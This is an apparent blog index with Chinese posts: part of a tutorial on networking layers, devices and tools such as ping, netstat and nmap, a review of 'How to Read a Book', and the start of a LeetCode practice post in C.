“3层交换机”是在“2层交换机”的基础上，增加了对网络层的处理。因此，它可以做到类似路由器的效果——在几个子网之间转发数据。 与路由器的差别在于——“3层交换机”链接的几个子网是【同种】网络；而路由器可以连接【异种】网络。 从上面这句话看，“3层交换机”的能力显然不如“路由器”。既然已经有“路由器”，为啥还要发明“3层交换机”捏？这就要说到【单臂路由器】的弊端。 对于企业内网的“2层交换机”，通常都支持 VLAN 功能。通俗地说：可以在交换机中划分多个【虚拟子网】。其实这些子网的中所有的电脑，都还是接入这台交换机，只不过这些子网配置了不同的网络地址。对于同一个 VLAN 内部的通讯，“2层交换机”自己就可以搞定（只需要用到2层协议）；但对于【跨】VLAN 主机之间的通讯，“2层交换机”就没戏啦（它没有路由功能）。因此，就必须在它旁边外加一个路由器，形成如下拓扑结构。在这个拓扑中，路由器只与单个设备（2层交换机）相连，所以称之为“单臂”。 请注意：如下示意图只画了两台电脑，位于两个 VLAN。实际上可能有很多个 VLAN，每个里面有几十台电脑。于是，交换机与路由器之间的传输通道就会成为瓶颈——【跨】VLAN 的任意两台电脑通讯，数据包都要到路由器那里兜一圈。为了消除这种瓶颈，才发明了“3层交换机”——把路由功能直接集成到交换机内部。 （“单臂路由器”的拓扑结构） 无线热点（Wireless Access Point） “无线热点”通常用来提供无线接入，使得某个【无线】设备能接入到某个【有线】网络中。一般来说，热点都内置了路由功能，那么它就是“无线路由器”，对应到“3层”（网络层）。反之，如果没有路由功能，它就是“网桥”，属于“2层”（链路层）。 ◇网络层相关的【软件工具】ping 这个命令，很多人应该都知道。早在 Win9x 就有这个命令了。它使用（网络层的）ICMP 协议来测试某个远程主机是否可达。 提醒一下： 如果 ping 命令显示某个 IP 地址不可达，有很多种情况。比如说： 这个 IP 地址对应的主机已经关机这个 IP 地址对应的主机已经断线这个 IP 地址对应的主机拒绝响应 ICMP 协议从你本机到这个 IP 地址之间，有某个防火墙拦截了 ICMP 协议…… traceroute 这是一个通用的工具，用来测试路由。很早以前的 Windows 就已经内置了它，命令是 tracert。在 POSIX（Linux＆UNIX）上通常叫 traceroute 你可以用这个命令，测试你本机与互联网另一台主机之间的路由（也就是：从你本机到对方主机，要经过哪些路由器） ★传输层：概述◇传输层的必要性屏蔽“有连接 or 无连接”的差异 （上一个章节提到）网络层本身已经屏蔽了【异种网络】的差异（比如“以太网、ATM、帧中继”之间的差异），而且网络层也屏蔽了路由的细节。但网络层本身还有一个差异，也就是网络层的两种交换技术：电路交换（有连接） VS 分组交换（无连接）。 前面章节也提到了：上述两种交换技术各有很多支持者，并分裂为两大阵营。当年设计 OSI 模型的时候，为了保持中立性与通用性，并没有强制规定“网络层”必须采用何种交换机制。 对于开发网络软件的程序员来说，当然不想操心“网络层用的是哪一种交换机制”。因此，需要对网络层的上述差异再加一个抽象层（也就是“传输层”）。 从“主机”到“进程” 前面介绍的“网络层”，其设计是面向主机（电脑）。“网络层地址”也就是某个主机的地址。 而“传输层”是面向【进程】滴！因为传输层要提供给【网络软件】使用，而网络软件打交道的对象是【另一个网络软件】。因此，传输层必须在“网络层地址”的基础上，再引入某种新的标识，用来区分同一台主机上的不同【进程】。 ◇传输层的特殊性 在 OSI 7层模型中，传输层正好居中。这是一个很特殊的位置。 OSI 模型最下面3层，与【网络设备】比较密切。这里面所说的“网络设备”，既包括那些独立的主机（比如“路由器、交换机、等”），也包括电脑上的硬件（比如“网卡”）。 OSI 模型最上面3层，与【网络软件】比较密切（或者说，与“用户的业务逻辑”比较密切）。 而中间的传输层，正好是承上启下。对于开发应用软件的程序猿/程序媛，“传输层”是他们能感知的最低一层。 ◇传输层的【端口】 刚才谈“传输层的必要性”，提到说——“网络层地址”只能标识【主机】，而传输层必须要能标识【进程】。为了达到这个目的，于是就引入了“传输层端口”这个概念（为了打字省力，后续讨论简称为“端口”）。 在 OSI 模型中，“端口”的官方称呼是“传输服务访问点”（洋文缩写 TSAP）。但是作为程序员，俺已经习惯于“端口”这个称呼。后续介绍依然用“端口”一词。 当程序员使用传输层提供的 API 开发网络软件时，通常把“端口”与“网络地址”一起使用（构成“二元组”），就可以定位到某个主机上的某个进程。 ★传输层：具体实例◇传输层的【协议】 为了让程序员可以更爽地使用传输层来开发网络软件，传输层既要提供“有连接”的风格，也要提供“无连接”的风格。关于这两种风格的对比，前面已经聊过，这里不再浪费口水。 具体到“互联网协议族”，有两个主要的传输层实现，分别是 TCP ＆ UDP（前者是“有连接”，后者是“无连接”）。 除了 TCP ＆ UDP，“互联网协议族”还提供了其它一些传输层协议。因为比较冷门，俺就不介绍啦。 ◇传输层的【协议实现】 对于电脑主机（含移动设备），传输层的协议实现通常包含在操作系统自带的网络模块中（也就是“操作系统协议栈”）。具体参见如下示意图。 另外，还有一些专门的【4层】网络设备，也提供传输层的功能（参见后续的小节）。 （OSI 模型中，不同层次的协议实现） ◇套接字（socket API） 前面说了：传输层是面向程序员（让他们可以更方便地开发网络软件）。因此，就需要提供一些封装传输层的【库】（API）。程序员只需要调用这些【库】，就可以使用传输层的协议进行通讯啦。 影响力最大的传输层封装库，当然是 socket API。它来自加州大学伯克利分校。 在互联网诞生初期，伯克利分校开发了一个 UNIX 操作系统的的变种，叫做“伯克利 UNIX 发行版”（BSD Unix），也就是如今 BSD 操作系统的前身。伯克利发行版内置了一套用来进行网络编程的 API，当时叫做“伯克利套接字”（Berkeley sockets）。由于这套 API 用起来很方便，很多其它的 UNIX 变种也移植了这套 API，于是就逐渐成了业界的事实标准。到了上世纪90年代，Windows ＆ Linux 也都提供了这套 API。 由于大部分读者不是程序员，“套接字”这个话题就到此为止。如果你是个程序员，并且对网络编程感兴趣，可以参考俺的电子书清单，其中有一个分类目录是【IT 类 / 软件开发 / 网络相关】。 ◇传输层相关的【网络设备】4层交换机（Layer 4 switching） 前面已经介绍了“3层交换机”，“4层交换机”是其进一步的改良，可以识别传输层的协议，获取 TCP or UDP 的端口号。 有了这个能力，网管就可以在这种交换机上配置一些管理策略。比如说：（根据传输层端口号）过滤掉某种流量，或者对某种流量设置转发的优先级。 状态防火墙（stateful firewall） 网络防火墙分好几种，大部分属于这种。它能完全处理 TCP 协议的状态，显然它属于“4层”（传输层）。 ◇传输层相关的【软件工具】netcat 家族——传输层的“瑞士军刀” 关于 netcat，俺已经写过一篇比较详细的教程：《扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”》。看完这篇教程，你肯定能体会它功能的强大——很多与 TCP/UDP 相关的事情，都可以用 netcat 搞定。 另外，netcat 还有很多衍生品（衍生的开源项目），构成一个丰富的 netcat 家族。在上述教程也有介绍。 netstat ＆ ss Windows 和 POSIX（Linux＆UNIX）都有一个 netstat 命令，可以查看当前系统的 TCP/UDP 状态（包括当前系统开启了哪些监听端口）。 另外，Linux 上还有一个 ss 命令，功能更强（但这个命令在 Windows 上默认没有） nmap 这是最著名的开源的扫描器，可以扫描远程主机监听了哪些传输层端口（注：前面提到的“netcat 家族”也可以干这事儿）nmap 的功能很强，“端口扫描”只是其功能之一。 ★业务层（OSI 上三层）：概述 一不小心，这篇教程已经写了这么长。为了照顾那些有“阅读障碍”的读者，俺要稍微控制一下篇幅，就把 OSI 的【上三层】合在一起讨论。 前面的章节说过：【上三层】更接近于“网络软件”，对应的是应用软件的业务逻辑，因此俺统称为“业务层”。 注：有些书（比如《计算机网络》）会把 OSI 的上三层统称为“应用层”。由于 OSI 模型中本来就有一个“应用层”，俺认为这样容易搞混（尤其不利于技术菜鸟），所以另外起了一个“业务层”的名称。 ◇业务层的必要性 业务层显然是必要滴。因为传输层位于操作系统，它不可能去了解网络软件的业务逻辑。为了让网络软件能够相互通讯，肯定要在传输层之上再定义更高层的协议。 问题在于：网络软件千奇百怪，其业务逻辑各不相同，因此，“业务层如何设计”，【无】一定之规。有些软件只用一个协议来搞定所有的业务逻辑（只有一层）；有些软件会参考 OSI，把业务逻辑的协议分为三层；还有些软件可能会分出更多的层次。 再强调一下：业务层的协议如何分层，完全看具体的业务逻辑，不要生搬硬套任何现有的参考模型。 ◇会话层 ＆ 表示层 ＆ 应用层 对于大部分读者来说，【没必要】花时间去了解 OSI 最上面三层之间的区别。你只需把最上面三层视作【一坨】——他们都是与网络软件的业务逻辑密切相关滴。 那么，哪些人需要详细了解“这三层的差异”捏？ 如果你是个程序员，并且你正好是开发【网络】软件，俺建议你了解一下 OSI 模型的最上面三层，有助于你更深刻地思考某些网络协议的设计。 ★业务层（OSI 上三层）：具体实例◇业务层的【协议】 业务层的协议非常多。即使光把各种协议的名称列出来，也很费劲。所以俺就偷懒一下，只点评几个特别重要的协议。 HTTP 协议 如果让俺评选最重要的业务层协议，俺首推 HTTP 协议。互联网的普及推动了 Web 的普及，而 Web 的普及使得 HTTP 成为信息时代的重要支柱。当你上网的时候，你看到的网页（HTML 页面）就是通过 HTTP 协议传输到你的浏览器上。 如今 HTTP 已经不仅仅用来展示网页，还有很多业务层的协议是建立在 HTTP 协议之上。比如说：如果你用 RSS 订阅俺的博客，RSS 阅读器需要调用 blogspot 博客平台提供的 RSS 接口，这些 RSS 接口就是基于 HTTP 协议传输滴。 考虑到本文的篇幅，俺不可能在这里细聊 HTTP 协议的规格，有兴趣的同学可以去看《HTTP 权威指南》这本书。 SSL/TLS 协议 最早的 HTTP 协议是【明文】滴；为了强化安全性，后来又设计了 SSL 协议，用来【加密】HTTP 流量；再后来，SSL 升级为 TLS（这俩是同义词）。如今经常看到的 HTTPS 相当于“HTTP over TLS”。 SSL/TLS 设计得比较优雅（很灵活），使得其它业务层的协议可以很方便地架构在 SSL/TLS 之上。这样的好处是：其它协议就不用自己再设计一套加密机制＆认证机制。 SSL/TLS 对于安全性很重要。 域名相关的协议（DNS 及其它） 域名相关的协议，也很重要。因为域名系统是整个互联网的基础设施。最早的域名查询协议是“DNS 协议”，由于这个协议【没有】加密，导致了一些安全隐患。比如 GFW 就利用 DNS 的这个弱点，搞“域名污染/域名投毒”。因此，后来又设计了一系列新的域名协议，引入了加密的机制。 ◇业务层相关的【网络设备】应用层防火墙（application firewall） 前面提到了：大多数网络防火墙处于4层（状态防火墙），另外还有少数处于7层，也就是“应用层防火墙”（有时候也称之为“7层防火墙”）。 一般来说，这类防火墙具备了【深度包检测】（deep packet inspection，简称 DPI）的能力，可以分析应用层协议的【内容】。 简单说一下“深度包检测”： 如果某个网络设备，仅仅分析“应用层协议”本身，它还【不够格】称之为 DPI。为了做到 DPI，还要能理解应用层协议所承载的【内容】。 比如说：某人通过【明文】的 HTTP 协议从网上下载了一个 zip 压缩包。对于这个下载行为，那些做得好的 DPI 设备不光能识别出“HTTP 协议的内容是 ZIP 压缩包”，而且还能从 ZIP 压缩包中提取出里面的文件。 入侵检测（intrusion detection system） 一般来说，“入侵检测”如果不加定语，通常指“【网络】入侵检测”（洋文叫 NIDS）；另外还有一种“【主机】入侵检测”（洋文叫 HIDS）。HIDS 与本文无关。 “入侵检测”是一种网络安全设备，它通过嗅探（sniffer）的方式抓取网上的数据包，然后进行分析，尝试发现网络中是否存在黑客/骇客的入侵的行为。故名“入侵检测”。 由于 IDS 需要理解【应用层】（7层）的内容，因此它与“应用层防火墙”有个共同点，需要具备某种程度的 DPI（深度包检测）能力。它俩的一大差异是【部署方式】。 考虑到很多读者是 IT 外行，简单说一下“旁路部署”——如果你学过中学物理，应该知道电路有“串联 ＆ 并联”。所谓的“旁路部署”类似于电路中的【并联】。通俗地说：IDS 是【并联】部署，防火墙是【串联】部署。 GFW（Great Firewall） 本博客已经写了很多翻墙教程，大伙儿肯定都知道 GFW 了。 由于“Great Firewall”中有“Firewall”字样，很多天朝网民【误以为】GFW 是防火墙，其实不然！GFW 本质上就是 IDS——其部署方式类似于 IDS（旁路部署），其工作方式有很大一部分也类似于 IDS（当然啦，GFW 的功能比 IDS 更多）。 大约七八年前，就有热心读者建议俺写一篇技术博文，介绍 GFW 的工作原理。由于俺比较懒，拖到今年（2021）都没动手，很惭愧 :( ★杂项 有些概念，并不属于某个特定的层次，单独放到这个章节。 ◇VPN（virtual private network） 咱们天朝的网民使用 VPN，一多半是为了翻墙。其实 VPN 的本意（如其名称所示）是为了提供某种虚拟化的私有的网络，让身处异地的多个人，可以用 VPN 构建出一个虚拟的内网，从而能在这个内网中协同工作。 VPN 的类型很多，使用的技术也各不相同，因此 VPN 对应的 OSI 层次很宽（“1层”到“6层”）。俺到维基百科剽窃了如下这张图，让你见识一下 VPN 的多样性。 （名目繁多的 VPN，分类示意图） ◇代理（proxy） 那些经常翻墙的同学，对“代理”应该都很熟悉了。“代理”与 VPN 类似，一开始并不是用来翻墙滴，“翻墙”只是这俩的副业。 代理服务器（proxy server） “代理服务器”部署在“客户端 ＆ 服务端”之间，起到某种“中介”的作用。“代理服务器”的类型有很多，干的事情各不相同。 （“代理服务器”的简单示意图） 代理客户端（proxy client） 早期的代理服务器，【不】需要“代理客户端”。因为早期的“代理服务器”支持的是【标准协议】。比如“HTTP proxy server”支持的是标准 HTTP协议，而用户的电脑上，已经有浏览器（原生支持 HTTP 协议）。这种情况下，自然不需要再有“代理客户端”。 后来，为了满足某些特殊需求（比如翻墙），“代理服务器”必须使用某种特殊的（非标准的）协议。因此，就必须在用户的环境中安装“代理客户端”。对于翻墙来说，你装的翻墙软件，相当于“代理客户端”。 代理的层次 “代理”也分不同的层次。比较常见的有如下几种： TCP 代理（TCP 端口转发）——4层（传输层）SOCKS 代理——5层（会话层）HTTP 代理——7层（应用层）…… ◇网关（gateway） 前面的某些章节，已经稍微提及了“网关”这个概念，但还没有具体介绍它。 严格来讲，“网关”是一个逻辑概念，【不要】把它当成具体的网络设备。充当“网关”的东东，可能是：路由器 or XX层交换机 or XX层防火墙 or 代理服务器 …… “网关”也分不同的层次。如果不加定语，通常指的是“3层网关”（网络层网关）。列几种比较常见的，供参考： 路由器充当网关——3层（网络层）3层交换机充当网关——3层（网络层）4层交换机充当网关——4层（传输层）应用层防火墙充当网关——7层（应用层）代理服务器充当网关——（取决于代理的层次，参见前一个小节）…… ◇隧道协议（tunneling protocol） 所谓的“隧道协议”，通俗地说就是：用某种协议包裹另一种协议，以满足某些特殊的需求。 看到这里，估计某些同学会感到纳闷——因为俺在本文开头介绍“协议栈”的时候提到说：相邻的两层协议，下层会包裹上层。“隧道协议的包裹”与“上下层协议的包裹”，差别在哪捏？ 俺来解释一下： “隧道协议”可以做到更灵活的包裹——既可以对层次相隔很远的协议进行包裹，也可以对同一层的协议进行包裹，甚至可以“倒挂”——所谓的“倒挂”就是让【上】层反过来包裹【下】层。 举例： 俺曾经写过一篇《如何让【不支持】代理的网络软件，通过代理进行联网（不同平台的 N 种方法）》，其中介绍了“HTTP 代理”的两种模式：“转发模式 ＆ 隧道模式”。对于“HTTP 代理”的隧道模式，可以实现【TCP over HTTP】（把 TCP 协议打包到 HTTP 协议内部），这就是刚才所说的“倒挂”。 另外，VPN 小节的那张图中，有些类型的 VPN 就是用“隧道协议”的机制实现。 ◇（其它杂项） 可能还有一些杂七杂八的东东，没来得及聊。如果你觉得有些【网络相关】的概念，不太明白，欢迎到博客留言，进行反馈。 俺会根据大伙儿的反馈，再对这篇教程进行补充。 ★参考书目 如下几本书，都在俺的网盘上分享了电子版。 中文书名 英文书名 作者 《计算机网络》 《Computer Networks》 Andrew Tanenbaum David Wetherall 《计算机网络——自顶向下方法》 《Computer Networking——A Top-Down Approach》 James Kurose Keith Ross 《TCP-IP 详解》 《TCP-IP Illustrated》 Richard Stevens 《UNIX 网络编程》 《UNIX Network Programming》 Richard Stevens 《HTTP 权威指南》 《HTTP——The Definitive Guide》 David Gourley Brian Totty Marjorie Sayer Sailu Reddy Anshu Aggarwal","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"programthink","slug":"programthink","permalink":"http://1905060202.github.io/tags/programthink/"},{"name":"计算机网络","slug":"计算机网络","permalink":"http://1905060202.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"如何阅读一本书？","date":"2021-07-16T13:32:13.000Z","path":"2021/07/16/如何阅读一本书？/","text":"《如何阅读一本书》——书评及内容纲要文章目录 ★为啥要推荐这本书？★此书的影响力★阅读的目的★主动阅读 VS 被动阅读★阅读的层次★如何读不同类型的书籍★阅读与心智的成长 ★为啥要推荐这本书？ 俺写博客奉行一个宗旨——【授人以鱼不如授人以渔】。而《如何阅读一本书》是阅读方面非常非常重要的【渔】。 为啥俺要介绍阅读方面的【渔】？主要有两个原因：原因1 想必大伙儿都意识到一个现象——如今大众的阅读水平是很差滴。即使一本不算难也不算厚的书，很多人也无法胜任。有些人甚至连阅读一篇较长的博文（超过1万字）都做不到——所以俺的大部分博文都尽量控制在几千字，以照顾某些阅读能力不够的同学。原因2 还有一个原因促使俺推荐此书——最近半年分享了很多电子书。但是据俺收到的反馈，很多人虽然下载了，却没怎么读。俺猜测，还有些人是因为缺乏阅读技能，导致收获不大。 如果你也感觉自己的阅读能力有待提高，这本书是非常非常值得【从头看完】滴。 ★此书的影响力 俺单独写一篇博文来推荐的书，通常都是老书——这本也不例外。 此书最早出版于1940年（在这个年代，可能你的父母还没出生）当时立刻就成为畅销书，还被翻译成多种文字。到1972年又出了一个修订版，补充了很多的内容。本文介绍的就是上世纪70年代的那个版本。 一本书历经这么久，还值得还单独写一篇博文推荐，足以说明其价值。 下面，结合俺个人的体会，对此书做一下内容简介。 强调一下：光看俺的内容简介是远远不够滴，一定要花时间自己从头到尾看完！！！ ★阅读的目的 在书的第1章（阅读的活力与艺术）就总结了阅读的三种目的：娱乐消遣、获取资讯、增进理解力。 啥是“娱乐消遣”捏？大伙儿应该都明白，俺就不说了。 “获取资讯”和“增进理解力”，可能很多人不太清楚这两者的区别。俺打一个不太恰当的比方：“获取资讯”如同在平地走路，而“增进理解力”如同爬山。 以【获取资讯】为目的 这种阅读目的，你只是获取信息，只需要动用“记忆力”。所以，这种阅读是比较【轻松】滴。轻松的代价就是——这样的阅读给你的帮助不够大。 比如：对新闻的阅读，就属于这类；对大部分小说的阅读，也属于这类。 以【增进理解力】为目的 如果某本书的内容超出了你的理解力，或者超出了你所熟悉的领域，那么你就需要花一定的力气才能读懂。这时候，光靠记忆力就远远不够了。你需要动用大脑的其它能力（分析、推理、总结、想像……）。显然，这种阅读过程伴随着更多的思考，可以让你的头脑提升到新的高度。 ★主动阅读 VS 被动阅读 所谓的“主动阅读”，指的是：你要带着问题去阅读，要一边阅读一边思考。俺称之为“挖掘式的阅读”。 “被动阅读”与之相反，在阅读过程中没有思考。俺称之为“灌输式的阅读”。 如果阅读目的是“增进理解力”，就是典型的主动阅读；如果是为了“娱乐消遣”，基本上是被动阅读；至于目的是“获取资讯”的阅读，则两者兼而有之。 如今大部分人只懂得“灌输式的阅读”，俺觉得主要原因有两个：1. 教育体制 天朝的教育，从来都是“灌输式”的。这样的教育培养出来的人，显然比较适应被动的阅读（被动灌输），而无法进行主动的阅读（主动挖掘）。 另外，天朝的官方教育，从来就没有系统性地培养独立思维能力，尤其是“批判性思维”的能力（关于“批判性思维”的入门，请看俺之前的博文，在“这里”）2. 快餐文化 而如今的网民，大部分人把大部分的时间花在消遣性的阅读，长期以往，主动阅读的能力就逐渐退化。 这方面的危害，微博客（microblog）尤甚——微博客不但碎片化很严重，而且助长了消遣性阅读的风气。（之前写过一篇博文，分析微博客的弊端） 那么，怎样才是“带着问题阅读”捏？作者写道： 关于一本书，你一定要提出四个主要的问题。 (1) 整体来说，这本书到底在谈些什么？你一定要想办法找出这本书的主题，作者如何依次发展这个主题，如何逐步从核心主题分解出从属的关键议题来。 (2) 作者在细部说了什么，怎么说的？你一定要想办法找出主要的想法、声明与论点。这些组合成作者想要传达的特殊讯息。 (3) 这本书说得有道理吗？是全部有道理，还是部分有道理？除非你能回答前两个问题，否则你没法回答这个问题。在你判断这本书是否有道理之前，你必须先了解整本书在说些什么才行。然而，等你了解了一本书，如果你又读得很认真的话，你会觉得有责任为这本书做个自己的判断。光是知道作者的想法是不够的。 (4) 这本书跟你有什么关系？如果这本书给了你一些资讯，你一定要问问这些资讯有什么意义。为什么这位作者会认为知道这件事很重要？你真的有必要去了解吗？如果这本书不只提供了资讯，还启发了你，就更有必要找出其他相关的、更深的含意或建议，以获得更多的启示。 更多内容，请看此书的第5章——如何做一个自我要求的读者 ★阅读的层次 此书的重点内容在于：介绍了4种阅读层次。 为啥称“层次”而不称“类型”，因为层次有“高低之分”，而且层次之间是递进关系而不是并列关系——上面的层次需要依赖下面层次的技能。 ◇基础阅读 顾名思义，这是最基本的阅读层次。在这个层次，只需要你做到“读懂书籍字面上的意思”。需要的技能仅仅是：识字、断句、联系上下文、等。 显然，列位看官都已经具备这个层次了——不具备这个层次的人，相当于半文盲。 对于这个层次，只是在第3章大概介绍了一下。因为咱们都不是学龄前儿童，所以这个层次不是重点。 ◇检视阅读 此书的第4章介绍“检视阅读”的各种技巧。 检视阅读有时候也可以称为“略读”。它要达到的目的就是：在非常有限的时间内，大致搞清楚一本书的内容和主题。 很多人可能看不起“略读”，其实这个技能是很有用滴。掌握这个技能，有助于你用尽可能短的时间，判断一本书的优劣。这样就避免在烂书上浪费太多时间。另外，在后续的“主题阅读”层次，也非常依赖“检视阅读”的能力。 举个例子：自从俺开始提供电子书下载，很多热心读者会主动分享电子书给俺。有些读者分享的电子书，俺从来没看过，如何判断此书要不要放到网盘上共享捏？这时候俺就会先采用“检视阅读”的各种技巧，快速判断该书的价值。 ◇分析阅读 分析阅读有时候也可以称为“精读”。一看到“精读”这个词，你就晓得这是重要的技能了。显然，只有对有价值的书，才值得花力气做“分析阅读”。“烂书或平庸的书”是没有这种待遇的。 这本书花了大量的篇幅来介绍“分析阅读”。这部分是此书【重点中的重点】。 分析阅读包括如下几个阶段： 第1阶段——这本书在谈些啥主要在第7章介绍。这个阶段你需要做如下4件事情。(1) 依照书本的种类与主题作分类。(2) 用最简短的句子说出整本书在谈些什么。(3) 按照顺序与关系，列出全书的重要部分。将全书的纲要拟出来之后，再将各个部分的纲要也一一列出。(4) 找出作者在问的问题，或作者想要解决的问题。 第2阶段——诠释整本书的内容主要在第8章和第9章介绍。这个阶段你需要做如下4件事情。(5) 找出重要的、关键性的词汇，透过它们与作者达成共识(6) 从最重要的句子里抓出作者的重要主旨。(7) 找出作者在论述些啥，重新架构这些论述的因果关系，以明白作者的主张。(8) 搞清楚作者已经解决了哪些问题，还有哪些是未解决的。在未解决的问题中，哪些是作者认为自己无法解决的。 第3阶段——评价这本书主要在第10章和第11章介绍。(9) 除非你已掌握某本书的架构，也能诠释整本书了，否则不要轻易评论。(10) 不要争强好胜，非辩到底不可。(11) 在说出评论之前，你要能区分出书中的“事实”与“观点”（参见俺的另一篇博文：《批判性思维扫盲：学会区分”事实”与”观点”》）如果要做出批评性的评价，需要做到如下几条之一：(12) 证明作者的知识不足。(13) 证明作者的知识有误。(14) 证明作者的逻辑错误（关于常见逻辑谬误，俺写过一篇扫盲，在“这里”）。(15) 证明作者的分析与理由不够完整。 另外，在第12章介绍了辅助阅读。包括利用外在的工具和资源（比如工具书，百科全书、字典、等）辅助阅读某本书。 说到“百科全书”，稍微引申一下。 如今百科类的网站已经很成熟了。这类网站可以非常有效地作为阅读的辅助工具。在《网站的类型和使用场景》一文中，大致介绍了俺如何使用百科类网站。在所有的百科类网站中，本人强烈推荐“维基百科”——其内容之丰富是无与伦比的，而且包括多语种，有助于提升你阅读洋文的功底。 ◇主题阅读 关于主题阅读，主要在第20章介绍。 所谓的“主题阅读”，通俗而言就是：为了研究某个主题，阅读跟该主题相关的多本书籍。这种阅读主要包括5个步骤： 1. 找到这几本书的相关章节 这时候，“检视阅读”又派上用场了。 2. 带引作者与你达成共识 这个步骤有点类似于“分析阅读”的第2阶段。 3. 厘清问题 你可以列出一些问题，然后看看这几本书能否回答这些问题。 4. 界定议题 如果几本不同的书籍都能够回答同一个问题，并且答案有差异。那么，你可以根据答案的差异、作者的情况、进而判断出这个问题的价值。 比方说：如果某个问题，多本书的作者给出全然不同的答案，而且这几本书的作者在立场的客观性、分析的全面性、思维的深度等方面都足够。那么这个问题就是一个非常有价值的问题，值得深入思考。 5. 分析讨论 找到有价值的问题之后，就需要通过自己的综合分析，思考一下：【为什么】这几本书的作者，对同一个问题会有不同的答案。如果你能想明白，那么你对该主题所处的领域，就有了更深刻的理解。 ★如何读不同类型的书籍 这本书的如下章节，分别介绍了具体类型的书籍，有哪些阅读技巧。 第13章 如何阅读实用型的书第14章 如何阅读想像文学第15章 如何阅读故事、戏剧、诗歌第16章 如何阅读历史书第17章 如何阅读科学与数学第18章 如何阅读哲学书第19章 如何阅读社会科学 ★阅读与心智的成长 这是此书最后一章的内容，包括如下几个小节： ◇好书能带来什么帮助？ 前面介绍的，都是关于“如何更好地阅读”，但是书籍本身的好坏也很重要。关于好书的重要性，俺摘录一段： 读一本好书，却会让你的努力有所回报。最好的书对你的回馈也最多。当然，这样的回馈分成两种：第一，当你成功地阅读了一本难读的好书之后，你的阅读技巧必然增进了。第二（长期来说这一点更重要）一本好书能教你了解这个世界以及你自己。你不只更懂得如何读得更好，还更懂得生命。你变得更有智慧，而不只是更有知识—像只提供讯息的书所形成的那样。你会成为一位智者，对人类生命中永恒的真理有更深刻的体认。 请注意这段提到的两个词【知识】和【智慧】——只提供讯息的书，带给你“知识”；而真正的好书带给你“智慧”。至于消遣性的书，既不会给你知识，也不会给你智慧。 ◇书籍的金字塔 书籍的好坏是符合【二八原理】滴！ 关于书籍的金字塔，包括三层： 第1层 99% 的书籍对于你的能力提升是毫无帮助的。这 99% 里面，相当大一部分书是“消遣性”的，还有一些可能是跟你完全无关的领域。 显然，这些书籍是不需要进行“分析阅读”的。 第2层 这一层次的书籍，你至少要做一次完整的“分析阅读”。经过一次分析阅读之后，你基本上就“读通”了，知道这本书的主要精华。一旦读通，以后你就无需再去阅读。顶多是偶尔拿出来翻看个别重点，复习某些片段。 第3层 这一层次的书，非常非常少。它们的特点是：你无法通过一次完整的“分析阅读”，就把它读通。甚至有可能你进行了 N 次分析阅读，也无法尽其究竟。 为啥会这样捏？俺介绍一下第2层与第3层之间的微妙差异： 第2层与第3层的差异 第2层的书 当你进行多次分析阅读，每次的收获会变少。因为你的本人的积累增多了，理解力提升了，而书的内容是固定的。显然每次阅读，收获降低了。 第3层的书 随着你的能力提升，每一次对该书进行分析阅读，你的收获都是全新的。甚至有可能后面的阅读，收获会更多。为啥会这样捏？因为这类书的作者，境界远远高于你本人。有可能在你一生的不同阶段都可以反复阅读同一本书，始终有收获。因为你始终达不到该书作者的境界。 ◇生命与心智的成长 这一节有两段话，俺摘录如下（粗体是俺标注滴）。希望能激发大伙儿对思考的热情。 人类的心智有很奇怪的一点，主要是这一点划分了我们心智与身体的截然不同。我们的身体是有限制的，心智却没有限制。其中一个迹象是，在力量与技巧上，身体不能无限制地成长。人们到了30岁左右，身体状况就达到了巅峰，随着时间的变化，身体的状况只有越来越恶化，而我们的头脑却能无限地成长与发展下去。我们的心智不会因为到了某个年纪死就停止成长，只有当大脑失去活力，僵化了，才会失去了增加技巧与理解力的力量。 这是人类最明显的特质，也是万物之灵与其他动物最主要不同之处。其他的动物似乎发展到某个层次之后，便不再有心智上的发展。但是人类独有的特质，却也潜藏着巨大的危险。心智就跟肌肉一样，如果不常运用就会萎缩。心智的萎缩就是在惩罚我们不经常动脑。这是个可怕的惩罚，因为证据显示，心智萎缩也可能要人的命。除此之外，似乎也没法说明为什么许多工作忙碌的人一旦退休之后就会立刻死亡。他们活着是因为工作对他们的心智上有所要求，那是一种人为的支撑力量，也就是外界的力量。一旦外界要求的力量消失之后，他们又没有内在的心智活动，他们便停止了思考，死亡也跟着来了。","comments":true,"categories":[{"name":"经验分享","slug":"经验分享","permalink":"http://1905060202.github.io/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"博客","slug":"博客","permalink":"http://1905060202.github.io/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"programthink","slug":"programthink","permalink":"http://1905060202.github.io/tags/programthink/"},{"name":"小妙招","slug":"小妙招","permalink":"http://1905060202.github.io/tags/%E5%B0%8F%E5%A6%99%E6%8B%9B/"}]},{"title":"2021暑假leetcode训练（一）","date":"2021-07-10T04:30:51.000Z","path":"2021/07/10/2021暑假leetcode训练（一）/","text":"初级算法（一）写在前面因为还在学习C++，所以本次刷题所使用的编程语言为C。下学期我们会开一门叫做《计算机算法》的专业课，我想先提前玩一玩算法，所以就通过leetcode平台去刷题了。在每道算法题解中，我会给出一种或多种解法(我的解法和其他人比较好的解法)。 删除排序数组中的重复项给你一个有序数组 nums ，请你 原地 删除重复出现的元素，使每个元素 只出现一次 ，返回删除后数组的新长度。 不要使用额外的数组空间，你必须在 原地 修改输入数组 并在使用 O(1) 额外空间的条件下完成。 说明为什么返回数值是整数，但输出的答案是数组呢? 请注意，输入数组是以「引用」方式传递的，这意味着在函数里修改输入数组对于调用者是可见的。 你可以想象内部操作如下: 12345678// nums 是以“引用”方式传递的。也就是说，不对实参做任何拷贝int len = removeDuplicates(nums);// 在函数里修改输入数组对于调用者是可见的。// 根据你的函数返回的长度, 它会打印出数组中 该长度范围内 的所有元素。for (int i = 0; i &lt; len; i++) &#123; print(nums[i]);&#125; 示例 1：123输入：nums = [1,1,2]输出：2, nums = [1,2]解释：函数应该返回新的长度 2 ，并且原数组 nums 的前两个元素被修改为 1, 2 。不需要考虑数组中超出新长度后面的元素。 示例 2：123输入：nums = [0,0,1,1,1,2,2,3,3,4]输出：5, nums = [0,1,2,3,4]解释：函数应该返回新的长度 5 ， 并且原数组 nums 